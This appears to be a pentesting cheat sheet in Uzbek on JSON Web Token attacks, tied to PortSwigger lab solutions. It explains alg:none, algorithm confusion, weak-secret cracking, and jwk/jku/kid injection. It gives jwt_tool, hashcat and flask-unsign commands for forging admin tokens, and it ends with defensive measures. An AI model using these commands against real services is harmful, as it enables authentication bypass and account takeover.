# JSON Web Tokens (JWT) Attacks

> Lab yechimlari (PortSwigger'ning 8 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
JWT = `header.payload.signature` (base64url). `payload` ichida kim ekaning (`sub`, `role`) yozilgan;
`signature` esa payload'ni server kaliti bilan imzolaydi, shunda hech kim o'zgartira olmaydi —
**agar server imzoni to'g'ri tekshirsa**. Zaiflik shunda: server imzoni umuman tekshirmaydi,
`alg:none` ni qabul qiladi, zaif secret ishlatadi, yoki kalitni header'dan (`jwk`/`jku`/`kid`)
oladi. Shunda sen payload'ni o'zgartirib (`role:admin`) o'zing imzolaysan.

**Ildiz sabab:** imzo — bu butun xavfsizlikning tayanchi. Agar u ixtiyoriy (algorithm confusion,
`alg:none`), zaif (brute qilsa bo'ladigan secret), yoki kalit manbasi foydalanuvchi boshqaradigan
(`jku`/`kid`) bo'lsa — token "server imzolagan" degan kafolatini yo'qotadi.

## Turlari (hujum bo'yicha)
- **Unverified signature** — server imzoni umuman tekshirmaydi → payload'ni o'zgartirasan.
- **`alg:none`** — algoritmni `none` qilib imzoni olib tashlaysan.
- **Weak HS256 secret** — secret'ni hashcat/wordlist bilan brute qilib qayta imzolaysan.
- **Algorithm confusion (RS256→HS256)** — RSA public key'ni HMAC secret sifatida ishlatasan.
- **`jwk` header injection** — o'z public key'ingni token header'iga embed qilasan.
- **`jku` header injection** — kalit to'plamini o'z serveringdan yuklattirasan.
- **`kid` path traversal / SQLi** — `kid` orqali ma'lum kalitga (`/dev/null`) yoki injeksiyaga.

## Oqibatlar (IMPACT)
- **Istagan user bo'lib token yasash** → auth bypass / ATO.
- `role:user` → `role:admin` → privilege escalation.
> Odatda **High/Critical**.

## Decode
```bash
echo "eyJ..." | cut -d. -f2 | base64 -d    # payload'ni ko'rish
```

## Hujumlar
```
1. alg:none        → imzoni butunlay o'chir ({"alg":"none"}, payload o'zgartir)
2. imzo tekshirilmaydi → imzoni buzib ko'r, baribir o'tsa
3. RS256→HS256     → public key'ni HMAC secret qilib imzola
4. zaif HS256 secret → brute (hashcat/jwt_tool)
5. jku/x5u injection → o'z JWKS URL'ingni qo'y
6. jwk embedded    → o'z public key'ingni token'ga joyla
7. kid injection   → path traversal/sqli kid orqali (/dev/null → HMAC(""))
8. exp tekshirilmaydi → muddati o'tgan token ishlaydi
```

## TOOLLAR

### jwt_tool — JWT podshosi
```bash
jwt_tool <TOKEN>
```
> Token'ni decode qilib, header/payload va qaysi hujum mumkinligini ko'rsatadi.

```bash
jwt_tool <TOKEN> -M at -t https://target.com/ -rh "Authorization: Bearer <TOKEN>"
```
> Barcha hujumni (alg:none, confusion, kid) avtomat target'ga urib sinaydi.

```bash
jwt_tool <TOKEN> -C -d rockyou.txt
```
> HS256 secret'ni wordlist bilan brute qiladi. Topsa — istagan token yasaysan.

```bash
jwt_tool <TOKEN> -S hs256 -p "found_secret" -I -pc role -pv admin
```
> Topilgan secret bilan `role=admin` qilib yangi valid token imzolaydi.

```bash
jwt_tool <TOKEN> -X a
```
> `alg:none` hujumini bitta buyruqda yasaydi.

### hashcat — secret crack (tez, GPU)
```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```
> JWT HMAC secret'ni GPU bilan juda tez brute qiladi.

### Burp "JWT Editor" extension
```
Burp → JWT Editor → token'ni tahrirla, alg o'zgartir, o'z key bilan qayta imzola
```
> Repeater'da token'ni jonli o'zgartirib, har hujumni qo'lda sinaysan.

### flask-unsign — Flask JWT/session
```bash
flask-unsign --unsign --cookie "<cookie>" --wordlist rockyou.txt
```
> Flask ilovalarida session secret'ni topib, forge qilishga yo'l ochadi.

## Bypass checklist
```
□ alg:none  □ buzilgan imzo o'tadimi  □ RS256→HS256  □ secret brute
□ jku/x5u/jwk  □ kid injection  □ exp tekshiriladimi  □ claim o'zgartirish
```

## PoC
`role=admin` yoki boshqa `sub` bilan yasagan token server tomonidan qabul qilinib,
admin huquqi berilganini ko'rsat.

## Himoya
`alg`ni serverda qat'iy belgila, kuchli random secret / to'g'ri RS256 key management,
`jku/x5u/jwk/kid`ni ishonchsiz manbadan olma, `exp/nbf/iss/aud` tekshir, key rotation.
